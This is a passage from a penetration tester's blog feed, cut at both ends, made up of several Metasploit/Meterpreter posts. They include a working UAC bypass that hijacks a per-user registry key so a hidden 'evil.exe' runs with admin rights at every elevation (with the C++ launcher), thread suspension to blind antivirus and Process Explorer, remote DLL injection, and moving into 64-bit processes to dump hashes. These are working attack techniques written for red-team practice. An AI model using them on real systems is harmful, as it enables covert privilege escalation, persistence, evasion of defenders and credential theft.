&lt;p&gt;Then it&amp;rsquo;s all just parsing the result. Also pretty straight forward. First we get the number of entries which is held in the first 4 bytes, then just parse the &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa366917%28v=vs.85%29.aspx&#34;&gt;MIB_TCPTABLE&lt;/a&gt; one &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa366909%28v=vs.85%29.aspx&#34;&gt;MIB_TCPROW&lt;/a&gt; at a time (translating the state to something readable):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;def parse_tcptable(buffer)
	entries = buffer[0,4].unpack(&amp;quot;V*&amp;quot;)[0]
	print_status(&amp;quot;Total TCP Entries: #{entries}&amp;quot;)
	rtable = Rex::Ui::Text::Table.new(
		&#39;Header&#39; =&amp;gt; &#39;Routing Table&#39;,
		&#39;Indent&#39; =&amp;gt; 2,
		&#39;Columns&#39; =&amp;gt; [&#39;STATE&#39;, &#39;LHOST&#39;, &#39;LPORT&#39;, &#39;RHOST&#39;, &#39;RPORT&#39;]
	)
	offset = 4
	(1..entries).each do
		x = {}
		x[:state] = case buffer[(offset + 0), 4].unpack(&amp;quot;V*&amp;quot;)[0]
		when 1
			&#39;CLOSED&#39;
		when 2
			&#39;LISTEN&#39;
		when 3
			&#39;SYN_SENT&#39;
		when 4
			&#39;SYN_RCVD&#39;
		when 5
			&#39;ESTABLISHED&#39;
		when 6
			&#39;FIN_WAIT1&#39;
		when 7
			&#39;FIN_WAIT2&#39;
		when 8
			&#39;CLOSE_WAIT&#39;
		when 9
			&#39;CLOSING&#39;
		when 10
			&#39;LAST_ACK&#39;
		when 11
			&#39;TIME_WAIT&#39;
		when 12
			&#39;DELETE_TCB&#39;
		else
			&#39;UNDEFINED&#39;
		end
		
		x[:lhost] = Rex::Socket.addr_itoa(buffer[(offset + 4), 4].unpack(&amp;quot;N&amp;quot;)[0])
		x[:lport] = buffer[(offset + 8), 4].unpack(&amp;quot;n&amp;quot;)[0]
		x[:rhost] = Rex::Socket.addr_itoa(buffer[(offset + 12), 4].unpack(&amp;quot;N&amp;quot;)[0])
		if x[:state] == &amp;quot;LISTEN&amp;quot;
			x[:rport] = &amp;quot;_&amp;quot;
		else
			x[:rport] = buffer[(offset + 16), 4].unpack(&amp;quot;n&amp;quot;)[0]
		end

		offset = offset + 20
		rtable &amp;lt;&amp;lt; [x[:state], x[:lhost], x[:lport], x[:rhost], x[:rport]]
	end

	print_status(rtable.to_s)
end
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>(UAC) User Assisted Compromise</title>
      <link>https://malicious.link/post/2012/2012-01-03-uac-user-assisted-compromise/</link>
      <pubDate>Tue, 03 Jan 2012 06:56:22 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-01-03-uac-user-assisted-compromise/</guid>
      <description>&lt;p&gt;A number of times during tests I&amp;rsquo;ve actually run into those mythical creatures called &amp;ldquo;patched windows machines&amp;rdquo;. At &lt;a href=&#34;http://www.derbycon.com&#34;&gt;DerbyCon&lt;/a&gt; &lt;a href=&#34;http://twitter.com/carnal0wnage&#34;&gt;Chris Gates&lt;/a&gt; and I released the &amp;ldquo;Ask&amp;rdquo; post module (which I had failed to publish). This module very simply uses the &lt;a href=&#34;&amp;quot;http://msdn.microsoft.com/en-us/library/windows/desktop/bb762153(v=vs.85&#34;&gt;ShellExecute windows function&lt;/a&gt;.aspx&amp;rdquo;) via &lt;a href=&#34;http://dev.metasploit.com/redmine/projects/framework/wiki/RailgunUsage&#34;&gt;Railgun&lt;/a&gt; with the undocumented (but very well known) operator of &amp;lsquo;runas&amp;rsquo;. These two lines accomplished that:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;client.railgun.add_function( &#39;shell32&#39;, &#39;ShellExecuteA&#39;, &#39;DWORD&#39;,[[&amp;quot;DWORD&amp;quot;,&amp;quot;hwnd&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpOperation&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpFile&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpParameters&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpDirectory&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;DWORD&amp;quot;,&amp;quot;nShowCmd&amp;quot;,&amp;quot;in&amp;quot;],])
client.railgun.shell32.ShellExecuteA(nil,&amp;quot;runas&amp;quot;,&amp;quot;evil.exe&amp;quot;,nil,nil,5)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This would quite simply prompt the user with that annoying UAC prompt asking the user to run &amp;lsquo;evil.exe&amp;rsquo; with Administrative privs. If they are not &amp;ldquo;Admins&amp;rdquo; themselves then it would prompt them for the user name and password (normally the case in systems attached to domains). Something to be aware of: If your evil.exe is not code-signed the UAC box will be orange instead of blue. You can get around this a bit by using rundll32.exe (which is signed ;-) ) as is svchost.exe. (You may also want to not name it evil.exe)&lt;/p&gt;

&lt;p&gt;The downfall here is that 1. You have to drop a binary (boooo) 2. You are prompting the user for UAC control when they didn&amp;rsquo;t do anything to cause it. Users are generally as smart as bait, but it&amp;rsquo;s good practice to assume to the contrary. If for nothing else other than to challenge yourself to up your game.&lt;/p&gt;

&lt;p&gt;Number 1 I&amp;rsquo;ll leave to another post, so lets solve #2.&lt;/p&gt;

&lt;p&gt;When a &amp;ldquo;runas&amp;rdquo; ShellExecute (which UAC runs natively #hint#hint) a few registry locations are checked. One I&amp;rsquo;d like to point out is the HKLM\Software\Classes\exefile key. The &amp;lsquo;exefile&amp;rsquo; as should be obvious is the registry settings for executables, and as such tells Windows how to interact with them. In HKLM (which is only writable by Administrators) the &amp;ldquo;shell\open&amp;rdquo;, &amp;ldquo;shell\runas&amp;rdquo; and &amp;ldquo;shell\runasuser&amp;rdquo; subkeys exist (the structure looks oddly familiar to anyone who visited the ShellExecute page more than once). Inside &amp;ldquo;shellopencommand&amp;rdquo; the default string has &amp;ldquo;%1&amp;rdquo; %*  - this basically means execute the binary %1 and hand the arguments given directly to it %*. Awesome! From here you can alter how every EXE runs on the system (don&amp;rsquo;t do it, Windows doesn&amp;rsquo;t like you afterwards, trust me, and remember to snapshot if you don&amp;rsquo;t).&lt;/p&gt;

&lt;p&gt;Great, but how does this help us, we aren&amp;rsquo;t admins. HKCU is writable by the &amp;lsquo;Current User&amp;rsquo; hence the name, and it so happens to have a very similar registry path: HKCU\Software\Classes. Depending on your system, it may or may not have a &amp;ldquo;exefile&amp;rdquo; subkey. If it doesn&amp;rsquo;t it&amp;rsquo;s pretty easy to create. Lets make it match the &amp;ldquo;runas&amp;rdquo; one in HKLM&lt;/p&gt;

&lt;p&gt;The tree should look something like this when you are done:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;HKLM

&lt;ul&gt;
&lt;li&gt;Software

&lt;ul&gt;
&lt;li&gt;Classes

&lt;ul&gt;
&lt;li&gt;exefile

&lt;ul&gt;
&lt;li&gt;shell

&lt;ul&gt;
&lt;li&gt;runas

&lt;ul&gt;
&lt;li&gt;command&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Under command change the default value to &amp;ldquo;%1&amp;rdquo; %* just as it is in HKLM, and add a new String value called &amp;lsquo;IsolatedCommand&amp;rsquo; with the same value as default. With these settings, very little has changed on the system or its operation. However, if we change the &amp;lsquo;IsolatedCommand&amp;rsquo; String to &amp;lsquo;notepad.exe&amp;rsquo; and attempt to &amp;lsquo;Run As Administrator&amp;rsquo; on that system using any binary guess what happens? Notepad! (as Admin). w00t. Now we can swap in our evil.exe and bob wins right? Sorta. We still have that horrible problem of stealth. Whatever the user was trying to UAC up won&amp;rsquo;t work, and they&amp;rsquo;ll try it again, and start investigating the problem, which we don&amp;rsquo;t want them to do.&lt;/p&gt;

&lt;p&gt;Enter &amp;lsquo;runyou.exe&amp;rsquo;, it&amp;rsquo;s some very simple C++ that weighs in at a whopping 8k when compiled (probably could loose some weight by those who know better compiler options):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include &amp;quot;windows.h&amp;quot;
#include &amp;quot;stdio.h&amp;quot;
#include &amp;quot;tchar.h&amp;quot;

int _tmain(int argc, _TCHAR* argv[])
{
    if (argv[1])
    {
        ShellExecuteW(NULL,NULL,argv[1],NULL,NULL,SW_SHOW);
        if (argv[2])
        {
            ShellExecuteW(NULL,NULL,argv[2],NULL,NULL,SW_HIDE);
        }
    }
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This code executes the first program visibly and then the second hidden. You probably see where this is going, but we change our IsolatedCommand String to runyou.exe %1 evil.exe and now we give them exactly what they want in an elevated state, but also get our evil binary there too ;-)&lt;/p&gt;

&lt;p&gt;The very real down side to this is you have to wait for the user to use UAC (this does not work if someone else does, it&amp;rsquo;s only for the current user HKCU). But, as a side benefit, it&amp;rsquo;s a very real form of sneaky persistence as well, as it will execute our evil binary every single time they use UAC.&lt;/p&gt;

&lt;p&gt;Game Over&amp;hellip; ;-)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Run POST Modules On All Sessions</title>
      <link>https://malicious.link/post/2011/2011-11-02-run-post-modules-on-all-sessions/</link>
      <pubDate>Wed, 02 Nov 2011 03:06:18 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-11-02-run-post-modules-on-all-sessions/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://twitter.com/jcran&#34;&gt;Jcran&lt;/a&gt; recently blogged about an easy way to run a post module on all sessions:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://blog.pentestify.com/simple-framework-domain-token-scanner&#34;&gt;http://blog.pentestify.com/simple-framework-domain-token-scanner&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;msf&amp;gt; use post/windows/gather/enum_domain_tokens
msf enum_domain_tokens&amp;gt; irb
framework.sessions.each do |session|
  run_single(&amp;quot;set SESSION #{session.first}&amp;quot;)
  run_single(&amp;quot;run&amp;quot;)
  sleep 1
end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You use the POST module, drop to IRB and run those 4 lines, and bam, you win. With resource files we can automate this a bit more and have it so that we do this effortlessly with any post module.&lt;/p&gt;

&lt;p&gt;Thinking back to &lt;a href=&#34;http://blog.metasploit.com/2010/03/automating-metasploit-console.html&#34;&gt;http://blog.metasploit.com/2010/03/automating-metasploit-console.html&lt;/a&gt; and my rapid file PSEXEC resource file, we know we can run ruby inside of resource files with the &lt;ruby&gt; tag.&lt;/p&gt;

&lt;p&gt;Save the following as runall.rc somewhere where you&amp;rsquo;ll remember:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;framework.sessions.each do |session|
  run_single(&amp;quot;set SESSION #{session.first}&amp;quot;)
  print_status(&amp;quot;Running #{active_module.fullname} against session #{session.first}&amp;quot;)
  run_single(&amp;quot;run&amp;quot;)
  sleep 1
end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then when you want to run a POST module against every session you have you simply do:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf&amp;gt; use post/windows/gather/enum_domain_tokens
msf enum_domain_tokens&amp;gt; resource runall.rc
[*] Running post/windows/gather/enum_domain_tokens on session 1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; on 2011-11-06 20:05 by Rob Fuller&lt;/p&gt;

&lt;p&gt;A commenter noticed an error in the coding for cross compatibility. The following should work better across versions:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;framework.sessions.each_key do |session|
  run_single(&amp;quot;set SESSION #{session}&amp;quot;)
  print_status(&amp;quot;Running #{active_module.fullname} against session #{session}&amp;quot;)
  run_single(&amp;quot;run&amp;quot;)
  sleep 1
end
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>The Dirty Little Secrets They Didn&#39;t Teach You In Pentesting Class</title>
      <link>https://malicious.link/post/2011/2011-10-06-the-dirty-little-secrets-they-didnt-teach-you-in-pentesting/</link>
      <pubDate>Thu, 06 Oct 2011 15:53:11 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-10-06-the-dirty-little-secrets-they-didnt-teach-you-in-pentesting/</guid>
      <description>

&lt;h4 id=&#34;video&#34;&gt;Video:&lt;/h4&gt;

&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;//www.youtube.com/embed/xXqyogdxITE&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;

&lt;h4 id=&#34;slides&#34;&gt;Slides:&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;http://www.slideshare.net/mubix/the-dirty-little-secrets-they-didnt-teach-you-in-pentesting-class-9530403&#34;&gt;The Dirty Little Secrets They Didn&amp;rsquo;t Teach You In Pentesting Class&lt;/a&gt;&lt;/strong&gt; [slideshare id=9530403]&lt;/p&gt;

&lt;h4 id=&#34;code&#34;&gt;Code:&lt;/h4&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/mubix/Not-In-Pentesting-Class&#34;&gt;https://github.com/mubix/Not-In-Pentesting-Class&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Create a 64bit Process From a x86/32bit One</title>
      <link>https://malicious.link/post/2011/2011-09-28-create-a-64bit-process-from-a-x8632bit-one/</link>
      <pubDate>Wed, 28 Sep 2011 05:45:22 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-09-28-create-a-64bit-process-from-a-x8632bit-one/</guid>
      <description>&lt;p&gt;On Vista and above there is a Windows &amp;lsquo;Redirector&amp;rsquo; (A redirector is basically a Symlink or fake directory that&amp;rsquo;s there but not in Windows) (&lt;a href=&#34;&amp;quot;http://msdn.microsoft.com/en-us/library/aa384187(v=vs.85&#34;&gt;more info here&lt;/a&gt;.aspx&amp;rdquo;)) that allows a 32bit process create a 64bit one. For anyone who has tried to run &amp;lsquo;execute -H -c -f notepad.exe&amp;rsquo;, they know that if they are in a 32bit process, they get a 32bit notepad even if they are on a 64bit system, which is annoying. So if you don&amp;rsquo;t want to read the link above you can create a stable 64bit notepad.exe by doing the following:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;execute -H -c -f &amp;quot;C:\\WINDOWS\\Sysnative\\notepad.exe&amp;quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Now you can migrate into that notepad, Metasploit/Meterpreter will handle not only the network socket switch but the upgrade to a 64bit process. Now, you should be able to dump hashes like I talked about (&lt;a href=&#34;https://malicious.link/blog/2011/5/15/dumping-hashes-on-win2k8-r2-x64-with-metasploit.html&#34;&gt;here&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;Of course you need to change the drive and windows directory to match your target (Language changes and base drive changes apply), but the rest should work as perscribed.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Who Is Logged In? A Quick Way To Pick Your Targets</title>
      <link>https://malicious.link/post/2011/2011-09-17-who-is-logged-in-a-quick-way-to-pick-your-targets/</link>
      <pubDate>Sat, 17 Sep 2011 02:37:31 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-09-17-who-is-logged-in-a-quick-way-to-pick-your-targets/</guid>
      <description>&lt;p&gt;Say you go for the 500+ shells on an internal test or your phishing exersice goes way better than you thought. Well you need to get your bearings quickly and going into each shell and doing a ps, then looking through the list for all the users logged in is a bit of a pain and defintely not ideal.&lt;/p&gt;

&lt;p&gt;I wrote a quick script that you can throw in the meterpreter scripts folder to aide you a bit with this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;users = []
client.sys.process.each_process do |x|
        users &amp;lt;&amp;lt; x[&amp;quot;user&amp;quot;]
end

users.sort!
users.uniq!
users.delete_if {|x| x =~ /^NT AUTHORITY/}
users.delete_if {|x| x == &amp;quot;&amp;quot;}
loggedin = users.join(&#39;, &#39;)
print_status(loggedin)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;All it does is automate the process I said above, used in concert with the &amp;lsquo;sessions -s&amp;rsquo; command makes life a bit easier:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf  post(enum_logged_on) &amp;gt; sessions -s loggedin
[*] Running script loggedin on all sessions...
[*] Session 1 (victimgatewayaddress:21638):
[*] DOMAIN\User1
[*] Session 2 (victimgatewayaddress:39900):
[*] DOMAIN\AdminUser1
[*] Session 3 (victimgatewayaddress:59395):
[*] DOMAIN\User5
[*] Session 5 (victimgatewayaddress:21639):
[*] DOMAIN\User20
[*] Session 6 (victimgatewayaddress:21640):
[*] COMPUTERNAME\Administrator, DOMAIN2\AdminUser7
[*] Session 7 (victimgatewayaddress:39901):
[*] DOMAIN\User55
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can see from this output I probably want to start with session 2, and probably 6 as well as it seems to be on another domain and an admin to boot. The example is small but on a larger scale this can start to be much more important for time management. I&amp;rsquo;m sure there are some of you out there that realized after spending hours with another session that you had one with a DA signed into it on a different system.&lt;/p&gt;

&lt;p&gt;Just a disclaimer, this ONLY shows who is logged into the sessions you have, not remote systems.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>IP Resolution Using Meterpreter’s Railgun</title>
      <link>https://malicious.link/post/2011/2011-08-19-ip-resolution-using-meterpreters-railgun/</link>
      <pubDate>Fri, 19 Aug 2011 19:26:55 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-08-19-ip-resolution-using-meterpreters-railgun/</guid>
      <description>&lt;p&gt;I saw a post back in June and it just recently came up again:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://www.securityartwork.es/2011/06/01/dns-port-forwarding-con-meterpreter/&#34;&gt;http://www.securityartwork.es/2011/06/01/dns-port-forwarding-con-meterpreter/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;It looked like a lot of hard work to set that up and I&amp;rsquo;m really lazy. I didn&amp;rsquo;t want to have to go through all that every time I got onto a new network. So, I made a very simple meterpreter post module to just call a Windows API key called &amp;lsquo;gethostbyaddr&amp;rsquo; using Railgun.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;TL:DR;&lt;/strong&gt; You can download the post module here: &lt;a href=&#34;https://gist.github.com/mubix/8215137&#34;&gt;ipresolver.rb&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The function &amp;lsquo;gethostbyaddr&amp;rsquo; (&lt;a href=&#34;&amp;quot;http://msdn.microsoft.com/en-us/library/ms738521(v=VS.85&#34;&gt;http://msdn.microsoft.com/en-us/library/ms738521(v=VS.85).aspx&lt;/a&gt;.aspx)&amp;ldquo;) is pretty simple at first glance:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;struct hostent* FAR gethostbyaddr(
  __in  const char *addr,
  __in  int len,
  __in  int type
);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Give it an address, length and type and it gives you a hostname back… easy right?&lt;/p&gt;

&lt;p&gt;Defining it, since it isn&amp;rsquo;t in the Railgun definitions is pretty simple:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.railgun.add_function(&#39;ws2_32&#39;, &#39;gethostbyaddr&#39;, &#39;DWORD&#39;, [        
	[&#39;PCHAR&#39;, &#39;addr&#39;, &#39;in&#39;],         
	[&#39;DWORD&#39;,&#39;len&#39;,&#39;in&#39;],         
	[&#39;DWORD&#39;,&#39;type&#39;,&#39;in&#39;]
])
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;First hurdle is to get your IP into &amp;lsquo;network byte order&amp;rsquo;. Rex (Metasploit&amp;rsquo;s API/Library) to the rescue.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.metasploit.com/documents/api/classes/Rex/Socket.html#M002073&#34;&gt;http://dev.metasploit.com/documents/api/classes/Rex/Socket.html#M002073&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The &amp;lsquo;addr_aton&amp;rsquo; method does just that:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;nbi = Rex::Socket.addr_aton(&#39;192.168.1.100&#39;)
=&amp;gt; &amp;quot;xC0xA8x01d&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Make the call to the API and done right?&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;result = client.railgun.ws2_32.gethostbyaddr(nbi.to_s, nbi.size,2)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Wrong, what you get back is a pointer to a mess, well lets get the mess (using a google IP for this example):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;struct = client.railgun.memread(result[&#39;return&#39;],100)
=&amp;gt; &amp;quot;xA0x03fx00x88x0Efx00x02x00x04x00x8Cx0Efx00x00x00x00x00x94x0Efx00x00x00x00x00J}]cqw-in-f99.1e100.netx00@efx00x06x00bx00x13x01bx00xE0vvx00xvvx00xE8x0Efx00xEEx96x03x00x00bx00x00 x01x00x00x01x00x00x00x01x00x00x00x01x00x00x00&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ya.. that…&lt;/p&gt;

&lt;p&gt;I tried using the pointer at the 12th byte location and that worked most of the time, but failed bad on others:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;ptrptr = struct[12,4].unpack(&amp;quot;V*&amp;quot;)[0]        
hostnameptr = client.railgun.memread(ptrptr,4).unpack(&amp;quot;V*&amp;quot;)[0]         
hostname = client.railgun.memread(hostnameptr+nbi.size,59).split(&amp;quot;&amp;quot;)[0]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;(there were a bunch more lines of error correcting but I&amp;rsquo;ll just wanted to show these as the actual methods used on a successful run)&lt;/p&gt;

&lt;p&gt;But on other hosts the 12th byte came back with a pointer to all 0s, so there was no way to jump again (hostnameptr) to the actual hostname.&lt;/p&gt;

&lt;p&gt;What I missed while trying to do things the &amp;ldquo;C&amp;rdquo; way was that the hostname was always pretexted with the IP address in network byte order… Hold up, I know it begins with something I already know, and ends in the standard &amp;ldquo;C&amp;rdquo; string terminator of a null byte. So all of that plus the crazy error correction became:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;struct = client.railgun.memread(result[&#39;return&#39;],100)        
hostname = struct.split(nbi)[1].split(&amp;quot;&amp;quot;)[0]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2 lines… work 100% of the time in my test cases.&lt;/p&gt;

&lt;p&gt;That&amp;rsquo;s it, you can check out the download for the post module above.&lt;/p&gt;

&lt;p&gt;I do however have 1 disadvantage over how the guys at SecurityArtWork did things. You can&amp;rsquo;t thread it. For whatever reason the API call that I am using uses the exact same memory space for each lookup. I tried putting threading in and what I got was a bunch of systems that resolved to the exact same thing.&lt;/p&gt;

&lt;p&gt;If anyone knows a way to fix this I am all ears because right now the module is slow.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Remotely Suspend All Threads with Meterpreter</title>
      <link>https://malicious.link/post/2011/2011-05-30-remotely-suspend-all-threads-with-meterpreter/</link>
      <pubDate>Mon, 30 May 2011 21:52:59 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-05-30-remotely-suspend-all-threads-with-meterpreter/</guid>
      <description>&lt;p&gt;Just a follow up to my previous post. One of the things that sets that method apart is the fact that the suspension (once the DLL injection occurs) comes from within the process, and it suspends all the child processes as well.&lt;/p&gt;

&lt;p&gt;Another way you can do this without the injection is just sending a suspend to all the threads in the process.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;pid = 2980
targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
targetprocess.thread.each_thread do |x|
	targetprocess.thread.open(x).suspend
end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We open the process just like we did before, and make a very simple &amp;lsquo;each_thread&amp;rsquo; loop. There are a few AVs engines that detected this as tampering. But if you target isn&amp;rsquo;t AV&amp;hellip; Say it&amp;rsquo;s Process Explorer during CCDC, this might just confuse them enough to buy you some time to do other things without their watchful eye on you.&lt;/p&gt;

&lt;p&gt;The other cool thing that happened when I did this was Process Explorer didn&amp;rsquo;t detect the process as suspended. If you looked under the thread list they were all suspended but not the process itself according to Process Explorer.&lt;/p&gt;

&lt;p&gt;Not rocket science at all, but that&amp;rsquo;s because it&amp;rsquo;s built into the framework. Just another thing that metasploit makes dead simple.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Remote DLL Injection with Meterpreter</title>
      <link>https://malicious.link/post/2011/2011-05-30-remote-dll-injection-with-meterpreter/</link>
      <pubDate>Mon, 30 May 2011 16:35:40 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-05-30-remote-dll-injection-with-meterpreter/</guid>
      <description>&lt;p&gt;Recently Didier Stevens wrote &amp;lsquo;Suspender.dll&amp;rsquo; which is a DLL that will suspend a process and all of it&amp;rsquo;s child processes after a delay. 60 seconds is it&amp;rsquo;s default but you can rename the DLL to add a number (as such &amp;lsquo;Suspender10.dll&amp;rsquo; for 10 seconds) to make the delay whatever you wish. You can find the blog post and download here: &lt;a href=&#34;http://blog.didierstevens.com/2011/04/27/suspender-dll/&#34;&gt;http://blog.didierstevens.com/2011/04/27/suspender-dll/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Jonathan Cran and I had the same idea, as I&amp;rsquo;m sure many others did as well. This might work against AntiVirus setups that protect themselves from being killed or their services stopped.&lt;/p&gt;

&lt;p&gt;I still stand by my original claim that just removing it is easier (&lt;a href=&#34;https://malicious.link/blog/2010/11/16/silently-uninstall-sep&#34;&gt;Blog Post: Silently Uninstall SEP&lt;/a&gt;). However that might be something the user notices (A little shield disappearing).&lt;/p&gt;

&lt;p&gt;Well, I didn&amp;rsquo;t know how to do this with meterpreter so a bit of google fu landed me on: &lt;a href=&#34;http://www.codeproject.com/KB/threads/winspy.aspx&#34;&gt;http://www.codeproject.com/KB/threads/winspy.aspx&lt;/a&gt; which has 3 different ways to attack the 2nd of which used a DLL (score!)&lt;/p&gt;

&lt;p&gt;Using IRB within a meterpreter shell I started using Railgun (because once you know something sometimes its easy not too look for other solutions)&lt;/p&gt;

&lt;p&gt;I start off setting up some variables after I&amp;rsquo;ve uploaded Suspender.dll:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;pid = 1436
sizeofsuspend = 52376
pathtosuspend = &amp;quot;C:\Docume~1\Administrator\Desktop\Suspender10.dll&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next up we need to open a handle on the target process:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;handle = client.railgun.kernel32.OpenProcess(PROCESS_ALL_ACCESS,false,pid)[&amp;quot;return&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With the handle we allocate some memory in the remote process for our DLL to live in:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;allocatedmem = client.railgun.kernel32.VirtualAllocEx(handle,nil,sizeofsuspend,MEM_COMMIT,PAGE_READWRITE)[&amp;quot;return&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Writing that DLL to memory isn&amp;rsquo;t much harder: (&lt;em&gt;&lt;strong&gt;this and the previous step is the wrong way to do things as we&amp;rsquo;ll see later&lt;/strong&gt;&lt;/em&gt;)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.railgun.kernel32.WriteProcessMemory(handle,allocatedmem,pathtosuspend,sizeofsuspend,nil)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here is the hard part. We have to somehow figure out the address LoadLibraryA in the remote processes memory space, accounting for ASLR then pass it the location in memory where our DLL is hiding. Yah, I couldn&amp;rsquo;t figure this one out, here is the best I did:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.railgun.kernel32.CreateRemoteThread(handle,nil,0,allocatedmem,pathtosuspend,0,nil)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then I got a friendly reminder by HD that most of this was built into meterpreter already so all that railgun nastness boils down to someting a lot simpler. Set the variables again:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;pid = 1436
pathtosuspend = &amp;quot;C:\Docume~1\Administrator\Desktop\Suspender10.dll&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But this time we are going to use the loadlibrary payload that just got added to Metasploit Framework in &lt;a href=&#34;https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12765&#34;&gt;r12765&lt;/a&gt;. We generate the payload with it pointing at our Suspender DLL:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;pay = client.framework.payloads.create(&amp;quot;windows/loadlibrary&amp;quot;)
pay.datastore[&#39;DLL&#39;] = pathtosuspend
pay.datastore[&#39;EXITFUNC&#39;] = &#39;thread&#39;
raw = pay.generate
&lt;/code&gt;&lt;/pre&gt;

